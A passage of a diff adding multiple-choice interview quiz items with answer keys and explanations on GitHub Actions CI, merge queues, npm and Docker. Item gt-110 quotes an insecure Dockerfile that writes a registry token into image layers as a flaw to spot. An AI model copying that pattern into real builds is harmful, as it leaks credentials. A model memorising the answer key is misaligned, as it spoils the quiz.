+      "choices": [
+        "Nothing; `pull_request_target` sandboxes the PR code for this reason",
+        "It runs fork code with the base repository's secrets and write token",
+        "It tests the base branch, not the PR, so the results are meaningless",
+        "It fails, because `pull_request_target` cannot check out fork commits"
+      ],
+      "answer": 1,
+      "why": "`pull_request_target` runs in the base repository's context with secrets and a write-capable token, intended for tasks like labelling. Installing and running the fork's code there hands an attacker those secrets: an install script is enough. Run untrusted code under plain `pull_request` instead.",
+      "tags": ["ci", "github-actions", "security"],
+      "level": 3,
+      "asked": "Known as a 'pwn request'; knowing it signals real awareness of CI security."
+    },
+    {
+      "id": "gt-080",
+      "q": "What does this block do on a busy PR?",
+      "code": "concurrency:\n  group: ci-${{ github.ref }}\n  cancel-in-progress: true",
+      "lang": "yaml",
+      "choices": [
+        "Runs every job of the workflow on the same runner to save minutes",
+        "Stops two different PRs from running CI at the same time",
+        "Retries a cancelled run automatically once the next push finishes",
+        "Cancels the older run for the same ref when a new push arrives"
+      ],
+      "answer": 3,
+      "why": "Runs sharing a concurrency group are serialised, and `cancel-in-progress` cancels the running one when a newer one starts. Grouping by ref means only superseded runs for the same branch or PR are cancelled; other PRs are unaffected.",
+      "tags": ["ci", "github-actions"],
+      "level": 1,
+      "asked": "A cheap win that shows you think about CI cost and feedback speed."
+    },
+    {
+      "id": "gt-081",
+      "q": "You must never cancel a production deploy halfway. How should concurrency be set for the deploy workflow?",
+      "choices": [
+        "Omit `concurrency`, because deploys already run one at a time",
+        "One fixed group for deploys, with `cancel-in-progress: false`",
+        "A group per commit SHA with `cancel-in-progress: true`",
+        "A `timeout-minutes: 0` on the deploy job so it cannot be stopped"
+      ],
+      "answer": 1,
+      "why": "A single group such as `deploy-production` queues deploys so two never overlap, and `cancel-in-progress: false` lets the running one finish while a newer one waits. Without a group, two merges in quick succession deploy concurrently and can finish in the wrong order.",
+      "tags": ["ci", "cd", "github-actions"],
+      "level": 3,
+      "asked": "Shows you have thought about what 'cancel' means for side-effecting jobs, not just tests."
+    },
+    {
+      "id": "gt-082",
+      "q": "In a matrix of Node 20, 22 and 24, the Node 20 job fails. What happens to the others by default?",
+      "choices": [
+        "They keep running, since matrix jobs are fully independent",
+        "They restart on Node 24 only, as the latest supported version",
+        "The in-progress ones are cancelled, because `fail-fast` defaults to true",
+        "They finish, and the workflow is marked successful as long as at least one job passed"
+      ],
+      "answer": 2,
+      "why": "`strategy.fail-fast` defaults to true, cancelling the remaining matrix jobs when one fails, which saves minutes but hides whether the failure is version-specific. Set `fail-fast: false` when you need the whole picture.",
+      "tags": ["ci", "github-actions"],
+      "level": 2,
+      "asked": "Matrix builds are common for libraries; the default is a frequent surprise."
+    },
+    {
+      "id": "gt-083",
+      "q": "You want a step that posts to Slack only when an earlier step in the job failed. Which condition do you use?",
+      "choices": [
+        "`if: failure()`",
+        "`if: always()`",
+        "`if: cancelled()`",
+        "`if: !success()`"
+      ],
+      "answer": 0,
+      "why": "Steps run only when everything before succeeded unless the `if` uses a status function. `failure()` is true when a previous step failed. `always()` would post on success too, `cancelled()` only on cancellation, and `!success()` would also fire on cancellation (and needs quoting in YAML because of the leading `!`).",
+      "tags": ["ci", "github-actions"],
+      "level": 1,
+      "asked": "Simple, but people often reach for always() and then spam the channel."
+    },
+    {
+      "id": "gt-084",
+      "q": "A step runs `export APP_VERSION=1.2.3`. The next step prints an empty `$APP_VERSION`. Why?",
+      "choices": [
+        "Environment variables need the `env:` prefix in their name before they persist between steps",
+        "Variables are only visible inside the job's `container:` block",
+        "The runner strips variables whose names contain `VERSION`",
+        "Each step is a new shell; write the value to `$GITHUB_ENV` to share it"
+      ],
+      "answer": 3,
+      "why": "Every `run` step starts a fresh process, so exported variables die with it. Appending `APP_VERSION=1.2.3` to the file at `$GITHUB_ENV` makes it available to later steps in the same job; `$GITHUB_OUTPUT` is for named step outputs.",
+      "tags": ["ci", "github-actions"],
+      "level": 1,
+      "asked": "Everyone hits it once; shows you understand how steps execute."
+    },
+    {
+      "id": "gt-085",
+      "q": "Your nightly workflow uses `schedule: cron: '0 2 * * *'`. When does it run?",
+      "choices": [
+        "02:00 UTC, on the latest commit of the default branch",
+        "02:00 in the repository owner's local time zone",
+        "02:00 UTC, on whichever branch last changed the workflow file",
+        "Exactly at 02:00 UTC, guaranteed to the second"
+      ],
+      "answer": 0,
+      "why": "Scheduled workflows use UTC and run the workflow file from the default branch. They can start late when runners are busy, and GitHub disables schedules in public repositories after 60 days without activity, so they are not a precise or guaranteed timer.",
+      "tags": ["ci", "github-actions"],
+      "level": 2,
+      "asked": "Time zones and 'why did my nightly job not run' come up in real maintenance work."
+    },
+    {
+      "id": "gt-086",
+      "q": "A job pushes a version-bump commit using the default `GITHUB_TOKEN`. Your `on: push` CI workflow does not run for it. Why?",
+      "choices": [
+        "Commits made in Actions are marked as drafts until a human pushes",
+        "Events caused by `GITHUB_TOKEN` do not trigger new workflow runs",
+        "The push was rejected, because the token has no write permission",
+        "CI skips commits whose message starts with 'chore'"
+      ],
+      "answer": 1,
+      "why": "To prevent infinite loops, events created with the repository's `GITHUB_TOKEN` do not start new runs (apart from `workflow_dispatch` and `repository_dispatch`). If you need the follow-on run, use a GitHub App token or trigger the next workflow explicitly.",
+      "tags": ["ci", "github-actions"],
+      "level": 3,
+      "asked": "Explains a confusing real behaviour; the strong answer names the loop-prevention reason."
+    },
+    {
+      "id": "gt-087",
+      "q": "Your CI workflow has `paths: ['src/**']` and its check is required on main. A PR changing only the README cannot be merged. Why?",
+      "choices": [
+        "Required checks always fail when no source files changed",
+        "The README must be listed in `paths` before it can be merged",
+        "The workflow never ran, so the required check stays pending forever",
+        "Path filters only apply to pushes, so the PR ran and failed silently"
+      ],
+      "answer": 2,
+      "why": "A workflow skipped by a path filter reports no status, and branch protection waits for a required check that never arrives. Fixes include a job that always runs and reports success when nothing relevant changed, or doing the path check inside the job.",
+      "tags": ["ci", "github-actions", "process"],
+      "level": 3,
+      "asked": "A real-world gotcha teams trip over after 'optimising' CI; it tests understanding of how required checks work."
+    },
+    {
+      "id": "gt-088",
+      "q": "What is the difference between a reusable workflow and a composite action?",
+      "choices": [
+        "A reusable workflow is YAML; a composite action must be written in JavaScript",
+        "A reusable workflow is called as a whole job; a composite action is used as a step",
+        "A reusable workflow only works within one repository; composite actions are shareable",
+        "A reusable workflow cannot take inputs; a composite action can"
+      ],
+      "answer": 1,
+      "why": "A workflow with `on: workflow_call` is invoked with `uses:` at the job level and can contain several jobs with their own runners. A composite action bundles steps and is used inside a job's steps. Both are YAML, both take inputs and both can be shared across repositories.",
+      "tags": ["ci", "github-actions"],
+      "level": 2,
+      "asked": "Relevant to anyone who has had to deduplicate CI across many repos."
+    },
+    {
+      "id": "gt-089",
+      "q": "Integration tests need Postgres in CI. What is the usual GitHub Actions approach?",
+      "choices": [
+        "Install Postgres with `apt-get` inside every test step",
+        "Point the tests at the shared staging database with a CI user",
+        "Replace Postgres with SQLite in CI because it needs no server",
+        "Declare a `services: postgres` container with a health check"
+      ],
+      "answer": 3,
+      "why": "Service containers start alongside the job, and a health-check option makes the job wait until the database accepts connections. Tests then run against the real engine you use in production. Sharing staging makes runs interfere with each other, and SQLite behaves differently on types, locking and SQL dialect.",
+      "tags": ["ci", "github-actions", "testing"],
+      "level": 2,
+      "asked": "Asked alongside 'how do you integration-test an API'; Testcontainers is an equally good answer."
+    },
+    {
+      "id": "gt-090",
+      "q": "How do you make production deploys in GitHub Actions wait for a human approval?",
+      "choices": [
+        "Add a `sleep` step and let someone cancel the run if needed",
+        "Give the deploy job an environment with a required-reviewers rule",
+        "Put the deploy in a separate repository that only admins can push to",
+        "Use `workflow_dispatch` and remove the automatic trigger"
+      ],
+      "answer": 1,
+      "why": "Environments carry protection rules such as required reviewers and wait timers, plus their own secrets that are released only after approval. A manual trigger works but loses the link to the tested build and the audit trail of who approved.",
+      "tags": ["ci", "cd", "github-actions"],
+      "level": 2,
+      "asked": "Shows you know the platform feature rather than inventing a manual workaround."
+    },
+    {
+      "id": "gt-091",
+      "q": "What does `permissions: id-token: write` enable in a deploy job?",
+      "choices": [
+        "Signing any commits the workflow makes with the runner's own machine identity",
+        "Writing user identity data to the repository's secret store",
+        "Requesting an OIDC token to exchange for short-lived cloud credentials",
+        "Creating a new GitHub App identity for the duration of the job"
+      ],
+      "answer": 2,
+      "why": "The job can ask GitHub for a signed OIDC token describing the repository, branch and environment; a cloud provider trusts that issuer and swaps it for temporary credentials. No long-lived key is stored in secrets. Without the permission the token cannot be requested.",
+      "tags": ["ci", "github-actions", "security"],
+      "level": 3,
+      "asked": "Follows the 'why OIDC' question; knowing the permission name shows hands-on use."
+    },
+    {
+      "id": "gt-092",
+      "q": "Your workflow uses `runs-on: ubuntu-latest`. One Monday, a build breaks without any code change. What is a likely cause?",
+      "choices": [
+        "`ubuntu-latest` was re-pointed to a newer image with different tools",
+        "The runner rebooted in the middle of the build, which corrupts the checked-out files",
+        "GitHub rotated your repository secrets over the weekend, so the old values stopped working",
+        "Weekend runs use slower runners that time out"
+      ],
+      "answer": 0,
+      "why": "`-latest` labels move to a new OS image over a rollout period, which changes preinstalled tool versions. Pin `ubuntu-24.04` and set tool versions explicitly with setup actions when reproducibility matters, then upgrade deliberately.",
+      "tags": ["ci", "github-actions", "dependencies"],
+      "level": 2,
+      "asked": "A reproducibility question; pairs with lockfiles and pinned Docker bases."
+    },
+    {
+      "id": "gt-093",
+      "q": "How does a step publish a value such as `version` for later steps to read as `steps.meta.outputs.version`?",
+      "choices": [
+        "`echo \"::set-output name=version::1.2.3\"` in the step",
+        "`export version=1.2.3` in a step with `id: meta`",
+        "`echo \"version=1.2.3\" >> \"$GITHUB_OUTPUT\"` in a step with `id: meta`",
+        "Setting `outputs: version: 1.2.3` under the step's own `with:` block of inputs"
+      ],
+      "answer": 2,
+      "why": "Appending `name=value` to the file at `$GITHUB_OUTPUT` sets a step output, readable by later steps via the step's `id`. The `::set-output` command is deprecated and disabled for security reasons, and exported shell variables do not outlive the step.",
+      "tags": ["ci", "github-actions"],
+      "level": 2,
+      "asked": "Everyday workflow authoring; many tutorials still show the deprecated form."
+    },
+    {
+      "id": "gt-094",
+      "q": "A job has hung for hours. What is the default `timeout-minutes` for a GitHub Actions job?",
+      "choices": [
+        "10 minutes",
+        "60 minutes",
+        "Unlimited",
+        "360 minutes"
+      ],
+      "answer": 3,
+      "why": "Jobs on GitHub-hosted runners default to a 6-hour timeout, so a hung test can burn hours of minutes. Setting a realistic `timeout-minutes` on each job (and step, where useful) fails fast and cheaply.",
+      "tags": ["ci", "github-actions"],
+      "level": 2,
+      "asked": "Less about the number than the habit of setting explicit timeouts."
+    },
+    {
+      "id": "gt-095",
+      "q": "Your team uses a merge queue on main. Why must CI also run on the `merge_group` event?",
+      "choices": [
+        "The queue tests a temporary branch of main plus queued PRs, not the PR itself",
+        "Merge queues cannot use `pull_request` workflows for any required status checks at all",
+        "`merge_group` is the only event that has access to repository secrets",
+        "The queue needs a separate workflow to rebase each PR onto main"
+      ],
+      "answer": 0,
+      "why": "A merge queue builds a temporary ref combining main with the PRs ahead of yours and requires the checks to pass on it before merging. If your workflow does not listen for `merge_group`, no check is reported and the queue stalls.",
+      "tags": ["ci", "github-actions", "process"],
+      "level": 3,
+      "asked": "Increasingly common on busy repos; shows you understand why a PR green on its own can still break main."
+    },
+    {
+      "id": "gt-096",
+      "q": "Why do teams enable 'Require branches to be up to date before merging' on main?",
+      "choices": [
+        "It forces each PR to be squashed into a single commit",
+        "It blocks merges while any other PR has a failing check",
+        "It stops a PR merging until main has no open conflicts",
+        "CI must have passed against the current main, not an old base"
+      ],
+      "answer": 3,
+      "why": "Two PRs can each pass against an old main yet break when combined. Requiring an up-to-date branch means the checks ran on the code that will actually land. On busy repositories a merge queue does the same without everyone rebasing repeatedly.",
+      "tags": ["ci", "git", "process"],
+      "level": 2,
+      "asked": "Explains how main breaks despite every PR being green, and leads to merge queues."
+    },
+    {
+      "id": "gt-097",
+      "q": "Secrets are masked in GitHub Actions logs. Which action can still leak one into the log?",
+      "choices": [
+        "Printing the secret's exact value with `echo`",
+        "Passing the secret to a step via `env:`",
+        "Printing a transformed form, such as its base64 encoding",
+        "Using the secret in a `curl` Authorization header, which curl echoes to stderr"
+      ],
+      "answer": 2,
+      "why": "Masking replaces exact occurrences of registered secret values. A base64 or URL-encoded version is a different string, so it is printed in full. Printing the exact value is masked, and passing it through `env` or a header does not log it unless you echo the command with its arguments.",
+      "tags": ["ci", "secrets"],
+      "level": 3,
+      "asked": "Tests whether you treat log masking as a safety net rather than a guarantee."
+    },
+    {
+      "id": "gt-098",
+      "q": "You want CI to catch vulnerable dependencies. Which statement about `npm audit` is accurate?",
+      "choices": [
+        "It scans your own code for injection bugs as well as dependencies",
+        "It checks installed versions against advisories and exits non-zero on findings",
+        "It upgrades vulnerable packages to patched versions automatically and rewrites the lockfile",
+        "It only checks direct dependencies listed in `package.json`"
+      ],
+      "answer": 1,
+      "why": "`npm audit` compares the resolved tree, including transitive packages, with the advisory database and returns a non-zero exit code when issues at or above `--audit-level` exist. `npm audit fix` makes changes; plain audit does not. It knows nothing about your own code.",
+      "tags": ["ci", "npm", "security"],
+      "level": 1,
+      "asked": "A basic supply-chain check; the strong answer mentions audit level and triaging dev-only findings."
+    },
+    {
+      "id": "gt-099",
+      "q": "Which ordering of CI steps gives the fastest useful feedback on a typical Node PR?",
+      "choices": [
+        "Build the Docker image, then run all tests inside it, then lint",
+        "End-to-end tests first, since they exercise the whole stack and catch the most bugs",
+        "Install, then lint and type-check, then unit tests, then slower suites",
+        "Unit tests, then deploy to staging, then type-check at the end"
+      ],
+      "answer": 2,
+      "why": "Cheap checks that fail often (lint, `tsc --noEmit`) should run first or in parallel so a typo fails in one minute, not twenty. Slow end-to-end suites come last or in a parallel job. Type-checking after a staging deploy wastes the deploy.",
+      "tags": ["ci", "process"],
+      "level": 1,
+      "asked": "Checks practical judgement about feedback loops rather than tooling trivia."
+    },
+    {
+      "id": "gt-100",
+      "q": "What is Dependabot (or Renovate) for in a repository's CI setup?",
+      "choices": [
+        "It opens PRs that bump dependency and action versions so CI can test them",
+        "It rewrites the lockfile at build time to use the newest versions",
+        "It blocks merges whenever any dependency in the lockfile is more than a year old",
+        "It scans your code for secrets before each push"
+      ],
+      "answer": 0,
+      "why": "These bots propose version bumps as ordinary PRs, so upgrades go through the same tests and review as any change. Builds stay reproducible because nothing changes until a PR merges. Secret scanning is a separate feature.",
+      "tags": ["ci", "dependencies"],
+      "level": 1,
+      "asked": "Shows you keep dependencies current deliberately rather than letting them rot or float."
+    },
+    {
+      "id": "gt-101",
+      "q": "A test fails in CI about one run in ten, never locally. What is the most useful first move?",
+      "choices": [
+        "Add an automatic retry to the CI job so the pipeline turns green and nobody is blocked",
+        "Delete the test, because a flaky test is worse than no test",
+        "Increase the job's timeout so the test has more time to finish",
+        "Record it, quarantine it with an owner, and look for timing or order dependence"
+      ],
+      "answer": 3,
+      "why": "Flaky tests usually hide real timing, shared-state or ordering bugs. Quarantining keeps main trustworthy while someone owns the fix; blanket retries teach everyone to ignore red builds, and deleting it throws away the signal.",
+      "tags": ["ci", "testing", "process"],
+      "level": 2,
+      "asked": "Every team has flaky tests; interviewers want a process, not a shrug."
+    },
+    {
+      "id": "gt-102",
+      "q": "What is a Git pre-commit hook (for example via Husky and lint-staged) good for, and what can it not do?",
+      "choices": [
+        "It runs checks locally before a commit, but `--no-verify` skips it, so CI must repeat them",
+        "It runs on the Git server and rejects pushes containing lint errors from every contributor",
+        "It is installed by `git clone` automatically, so every developer gets it",
+        "It replaces CI for linting, since every commit has already been checked"
+      ],
+      "answer": 0,
+      "why": "Client-side hooks give fast local feedback on staged files, but they live in each clone, must be installed by a tool such as Husky, and can be bypassed. They are a convenience; the pipeline is the enforcement point.",
+      "tags": ["git", "tooling", "ci"],
+      "level": 1,
+      "asked": "Distinguishes convenience from enforcement, which is the whole point of CI gates."
+    },
+    {
+      "id": "gt-103",
+      "q": "Why do teams use a `CODEOWNERS` file together with branch protection?",
+      "choices": [
+        "It gives the listed people exclusive push access to every file under the matching paths",
+        "It automatically requests, and can require, review from the owners of changed paths",
+        "It prevents anyone outside the file from opening pull requests",
+        "It sets who is paged when tests in those paths fail"
+      ],
+      "answer": 1,
+      "why": "Matching paths add their owners as reviewers, and with 'require review from code owners' a PR cannot merge without their approval. It does not change who can push or open PRs, and it is not an alerting config.",
+      "tags": ["git", "process", "code-review"],
+      "level": 1,
+      "asked": "Common in larger repos; shows awareness of review routing."
+    },
+    {
+      "id": "gt-104",
+      "q": "What does the Conventional Commits format (`feat:`, `fix:`, `feat!:`) make possible?",
+      "choices": [
+        "Git refuses commits that do not match the format",
+        "Commits can be merged without review when prefixed with `fix:`",
+        "The commit type decides which CI jobs run for that commit and which are skipped",
+        "Tools can derive the next semantic version and a changelog from history"
+      ],
+      "answer": 3,
+      "why": "Because the type is machine-readable, release tools can map `fix` to a patch, `feat` to a minor and `!` or `BREAKING CHANGE` to a major, and group entries into a changelog. Git itself does not enforce it; a commit-msg hook or CI check does.",
+      "tags": ["git", "versioning", "process"],
+      "level": 1,
+      "asked": "Links commit hygiene to release automation, which interviewers like to hear connected."
+    },
+    {
+      "id": "gt-105",
+      "q": "`npm ci` fails in CI with a message that `package.json` and `package-lock.json` are out of sync. What happened?",
+      "choices": [
+        "The CI cache holds an older `node_modules` that conflicts with the lockfile",
+        "The registry is down, so npm cannot verify the lockfile's integrity hashes",
+        "Someone changed `package.json` without committing the updated lockfile",
+        "`npm ci` needs `--force` whenever the lockfile is older than a week"
+      ],
+      "answer": 2,
+      "why": "`npm ci` installs exactly what the lockfile says and refuses to proceed if it does not satisfy `package.json`, rather than silently re-resolving. Run `npm install` locally, commit the lockfile, and the build passes. It deletes `node_modules` first, so a cached folder is irrelevant.",
+      "tags": ["ci", "npm"],
+      "level": 1,
+      "asked": "A daily CI failure; the fix is trivial but the reason shows you know what npm ci guarantees."
+    },
+    {
+      "id": "gt-106",
+      "q": "Your Node API container takes 10 seconds to stop on every deploy, then is killed. The Dockerfile ends with the line below. Why?",
+      "code": "CMD npm start",
+      "lang": "sh",
+      "choices": [
+        "Shell form runs a shell as PID 1, and SIGTERM never reaches your Node process",
+        "`npm start` needs a `--production` flag inside containers to handle signals",
+        "Docker always waits the full ten-second grace period before stopping any container",
+        "The image has no `EXPOSE` line, so Docker cannot tell when the port has closed"
+      ],
+      "answer": 0,
+      "why": "Shell form wraps the command in `/bin/sh -c`, so the shell (and then npm) receives SIGTERM and does not pass it on; after the grace period Docker sends SIGKILL. Use exec form, `CMD [\"node\", \"server.js\"]`, and handle SIGTERM to close the server. `EXPOSE` is documentation only.",
+      "tags": ["docker", "deployment"],
+      "level": 3,
+      "asked": "Slow, ungraceful shutdowns drop in-flight requests on every deploy; knowing exec form and PID 1 is a strong signal."
+    },
+    {
+      "id": "gt-107",
+      "q": "Your Node process runs as PID 1 in a container with no signal handlers. What happens when it receives SIGTERM?",
+      "choices": [
+        "It exits at once, as any process does for the default SIGTERM action",
+        "It ignores it, because the kernel skips default actions for PID 1",
+        "It restarts itself, because PID 1 is supervised by the Docker daemon",
+        "It forwards it to its child processes and waits for them to finish"
+      ],
+      "answer": 1,
+      "why": "The kernel does not apply default signal actions to PID 1, so a process without a SIGTERM handler keeps running until SIGKILL. Add a `process.on('SIGTERM', ...)` handler that drains the server, or run a tiny init such as `docker run --init` or tini.",
+      "tags": ["docker", "node"],
+      "level": 3,
+      "asked": "A deeper follow-up to exec form; people who have debugged a stuck container know it."
+    },
+    {
+      "id": "gt-108",
+      "q": "What does `EXPOSE 3000` in a Dockerfile actually do?",
+      "choices": [
+        "Publishes port 3000 on the host so the app is reachable from outside",
+        "Opens port 3000 in the container's firewall, which is closed by default",
+        "Documents the port; you still publish it with `-p` or compose `ports`",
+        "Makes the app listen on port 3000 instead of its configured port"
+      ],
+      "answer": 2,
+      "why": "`EXPOSE` is metadata used by tools and by `-P`; it neither publishes a port nor configures the app. `docker run -p 8080:3000` maps host port 8080 to container port 3000, and the app must listen on 3000 on `0.0.0.0`.",
+      "tags": ["docker"],
+      "level": 1,
+      "asked": "A quick check for people who have only copied Dockerfiles."
+    },
+    {
+      "id": "gt-109",
+      "q": "Your API works with `npm run dev` but inside the container `curl localhost:3000` from the host gets 'connection reset'. The port is published. What is the likely cause?",
+      "choices": [
+        "The app listens on `127.0.0.1`, which inside a container is unreachable from outside",
+        "Containers cannot use port 3000, because Docker reserves it for its own engine API",
+        "The host firewall blocks every published port until Docker restarts",
+        "`curl` needs `--http2` to talk to a process running inside a container"
+      ],
+      "answer": 0,
+      "why": "Inside the container, loopback is the container's own, so a server bound to `127.0.0.1` refuses traffic arriving on the container's network interface. Bind to `0.0.0.0` (or `::`) in containers.",
+      "tags": ["docker", "networking"],
+      "level": 2,
+      "asked": "One of the most common 'works locally, not in Docker' problems; the answer shows you understand container networking."
+    },
+    {
+      "id": "gt-110",
+      "q": "Why is this a bad way to give the build access to a private npm registry?",
+      "code": "ARG NPM_TOKEN\nRUN echo \"//registry.npmjs.org/:_authToken=$NPM_TOKEN\" > .npmrc && npm ci",
+      "lang": "sh",
+      "choices": [
+        "`ARG` values are cleared before `RUN`, so the token is always empty",
+        "The token ends up in the image metadata and layers anyone can inspect",
+        "npm ignores any `.npmrc` file that is created during a Docker build for security",
+        "Build arguments can only hold values shorter than 64 characters"
+      ],
+      "answer": 1,
+      "why": "Build args used in a `RUN` are recorded in the image history, and the `.npmrc` stays in that layer even if a later step deletes it. BuildKit secret mounts (`RUN --mount=type=secret,id=npmrc ...`) expose the file only during that step and never write it to a layer.",
+      "tags": ["docker", "secrets"],
+      "level": 3,
+      "asked": "Leaked registry tokens in public images are common; the secret-mount answer is what reviewers want."
+    },
+    {
+      "id": "gt-111",
+      "q": "A Dockerfile runs `RUN rm -rf /app/tmp` to delete a 500 MB folder copied in an earlier step. Why does the image not get smaller?",
+      "choices": [
+        "`rm` inside `RUN` only marks files as deleted until the container first starts",
+        "Docker compresses deleted files rather than removing them from the image",
+        "Deleted files are kept until you run `docker system prune` on the host",
+        "Layers are additive: the earlier layer still holds the folder"
+      ],
+      "answer": 3,
+      "why": "Each instruction adds a layer, and a later deletion only hides the files in the final filesystem view while the earlier layer still ships them. Avoid copying them in (`.dockerignore`), clean up in the same `RUN` that created them, or use a multi-stage build.",
+      "tags": ["docker"],
+      "level": 2,
+      "asked": "Tests whether you understand layers rather than treating a Dockerfile as a shell script."
+    },
+    {
+      "id": "gt-112",
+      "q": "What belongs in `.dockerignore` for a Node app?",
+      "choices": [
+        "`package-lock.json`, because the build should always resolve fresh versions",
+        "`Dockerfile`, because Docker cannot copy the file it is currently building",
+        "`src/`, because the build stage reads sources from the Git remote instead",
+        "`node_modules`, `.git` and `.env`, so they never enter the build context"
+      ],
+      "answer": 3,
+      "why": "The build context is sent to the builder, so excluding host `node_modules` (wrong platform binaries), `.git` (large, and busts caching) and `.env` (secrets) makes builds faster, smaller and safer. The lockfile must be included for `npm ci`.",
+      "tags": ["docker", "secrets"],
+      "level": 1,
+      "asked": "A quick practical check; the strong answer says why each entry matters."
+    },
+    {
+      "id": "gt-113",
+      "q": "In Docker Compose, `api` has `depends_on: [db]`. The API still crashes on start because Postgres is not ready. Why?",
+      "choices": [
+        "`depends_on` only affects the order of `docker compose down`, not startup",
+        "Plain `depends_on` waits for the container to start, not for Postgres to be ready",
+        "Compose starts services in alphabetical order, so `api` is always first",
+        "`depends_on` only works when both services are built from the same Dockerfile and context"
+      ],
+      "answer": 1,
+      "why": "Short-form `depends_on` orders container starts but does not wait for readiness. Give `db` a healthcheck (for example `pg_isready`) and use `depends_on: db: condition: service_healthy`, and still have the app retry its first connection.",
+      "tags": ["docker", "compose"],
+      "level": 2,
+      "asked": "Every compose setup hits this; the healthcheck condition plus app-side retries is the full answer."
+    },
+    {
+      "id": "gt-114",
+      "q": "In your compose file, the database maps `\"5433:5432\"`. Which address should the `api` service use?",
+      "choices": [
+        "`localhost:5433`",
+        "`db:5433`",
+        "`localhost:5432`",
+        "`db:5432`"
+      ],
+      "answer": 3,
+      "why": "Services reach each other by service name on the compose network, using the container's port. The `5433` mapping only matters from the host, for example for your SQL client. `localhost` inside `api` is the api container itself.",
+      "tags": ["docker", "compose", "networking"],
+      "level": 1,
+      "asked": "A small puzzle that shows whether you understand host versus container networking."
+    },
+    {
+      "id": "gt-115",
+      "q": "Your local Postgres data vanished after `docker compose down -v`. What did `-v` do?",
+      "choices": [
+        "It removed the named volumes declared by the compose file",
+        "It ran `down` verbosely and printed each removed container",
+        "It reset the volumes to the state saved in the image",
+        "It deleted only anonymous volumes; named ones are always kept"
+      ],
+      "answer": 0,
+      "why": "`down` removes containers and networks; `-v` also removes named volumes declared in the file and anonymous volumes, which is where the database lived. Plain `down` would have kept the data.",
+      "tags": ["docker", "compose"],
+      "level": 1,
+      "asked": "Everyone does it once; knowing volume lifecycles is the point."
+    },
+    {
+      "id": "gt-116",
+      "q": "In dev you bind-mount the project into the container. The app fails with an 'invalid ELF header' error from a native module. What is wrong?",
+      "choices": [
+        "Bind mounts are read-only, so npm cannot compile native modules",
+        "The Node version in the image is too new for native modules",
+        "The host's `node_modules` was mounted over the container's platform build",
+        "Native modules must be installed with `npm ci --native` when running inside containers"
+      ],
+      "answer": 2,
+      "why": "Mounting the whole project also mounts the host's `node_modules`, built for macOS or Windows, over the Linux one. Add an anonymous volume for `/app/node_modules` so the container keeps its own, or install inside the container only.",
+      "tags": ["docker", "compose", "node"],
+      "level": 2,
+      "asked": "A classic local-dev puzzle; the fix shows you understand mount precedence."
+    },
+    {
+      "id": "gt-117",
+      "q": "You build an image on an Apple Silicon Mac and run it on an x86 server. It fails with `exec format error`. Why?",
+      "choices": [
+        "The server's Docker version is too old for images built on macOS",
+        "The image was built for arm64, and the server needs linux/amd64",
+        "The entrypoint script has Windows line endings from the Mac",
+        "macOS builds images for the Darwin kernel, which Linux cannot run"
+      ],
+      "answer": 1,
+      "why": "Images are per CPU architecture, and an M-series Mac builds `linux/arm64` by default. Build with `--platform linux/amd64` or produce a multi-arch image with buildx; better still, build in CI on the target architecture.",
+      "tags": ["docker", "deployment"],
+      "level": 2,
+      "asked": "Very common since Apple Silicon; the strong answer mentions building in CI."
+    },
+    {
+      "id": "gt-118",
+      "q": "You switch the base image from `node:24-slim` to `node:24-alpine` and a dependency with native bindings now fails to load. What is the likely reason?",
+      "choices": [
+        "Alpine removes Node's module loader to save space",
+        "Alpine images run Node with ES modules disabled by default, so native imports fail",
+        "Alpine uses musl libc, and the prebuilt binary targets glibc",
+        "Alpine forbids binaries larger than 5 MB in any image layer"
+      ],
+      "answer": 2,
+      "why": "Alpine is built on musl rather than glibc, so native binaries compiled for glibc may not load, and packages need musl-specific builds or a compile toolchain. Slim Debian images avoid the issue at a modest size cost.",
+      "tags": ["docker", "node"],
+      "level": 3,
+      "asked": "Tests whether 'smaller image' comes with an understanding of the trade-off."
+    },
+    {
+      "id": "gt-119",
+      "q": "Why run the app as a non-root user inside the container (for example `USER node`)?",
+      "choices": [
+        "Root inside a container cannot open ports, so the app would fail to start",
+        "Non-root containers start faster, because root runs extra security checks",
+        "Docker Hub rejects images whose final user is root",
+        "It limits the damage if the app is compromised or escapes the container"
+      ],
+      "answer": 3,
+      "why": "Root in a container is root in the kernel's eyes unless user namespaces are configured, so a container escape or a writable host mount becomes far more dangerous. Official Node images ship a `node` user and .NET 8+ images an `app` user.",
+      "tags": ["docker", "security"],
+      "level": 1,
+      "asked": "Baseline container hygiene; interviewers expect it in any production Dockerfile."
+    },
+    {
+      "id": "gt-120",
+      "q": "You move an ASP.NET Core app from a .NET 6 image to `mcr.microsoft.com/dotnet/aspnet:9.0`. Health checks now fail on port 80. Why?",
+      "choices": [
+        "ASP.NET Core 9 no longer supports plain HTTP inside containers",
+        ".NET 8+ images listen on port 8080 by default, not 80",
+        "The aspnet image blocks ports below 1024 at the firewall level",
+        ".NET 9 requires the port to be set in `appsettings.json` only"
+      ],
+      "answer": 1,
+      "why": "Since .NET 8 the official images set `ASPNETCORE_HTTP_PORTS=8080` so the app can run as the non-root `app` user, which cannot bind below 1024. Update the port mapping and probes, or set the variable explicitly.",
+      "tags": ["docker", "dotnet"],
+      "level": 2,
+      "asked": "A real upgrade gotcha that shows you read release notes."
+    },
+    {
+      "id": "gt-121",
+      "q": "What does this `RUN` line gain over a plain `RUN npm ci`?",
+      "code": "RUN --mount=type=cache,target=/root/.npm npm ci",
+      "lang": "sh",
+      "choices": [
+        "Downloaded packages persist between builds without being stored in the image",
+        "`node_modules` is cached inside the image so that later `COPY` steps run faster",
+        "The layer is shared across every image on the machine to save disk",
+        "npm runs offline, so the build works without network access"
+      ],
+      "answer": 0,
+      "why": "A BuildKit cache mount keeps npm's download cache on the builder between builds, but it is not part of any image layer. It speeds up rebuilds when the lockfile changes; it does not make the build work offline on a cold cache.",
+      "tags": ["docker", "caching"],
+      "level": 3,
+      "asked": "A modern Dockerfile optimisation; knowing it is not in the image is the key point."
+    },
+    {
+      "id": "gt-122",
+      "q": "You deploy to Kubernetes. Does the Dockerfile's `HEALTHCHECK` instruction decide when the pod is restarted?",
+      "choices": [
+        "Yes, the kubelet runs it and restarts the container on failure",
+        "Yes, but only when no liveness probe is declared in the manifest",
+        "No, it is only used when the image is run on Docker Swarm",
+        "No, Kubernetes ignores it and uses the probes defined in the manifest"
+      ],
+      "answer": 3,
+      "why": "Kubernetes does not use Docker's `HEALTHCHECK`; liveness, readiness and startup probes in the pod spec control restarts and traffic. The instruction still helps with `docker run` and Compose's `service_healthy` condition.",
+      "tags": ["docker", "kubernetes"],
+      "level": 2,
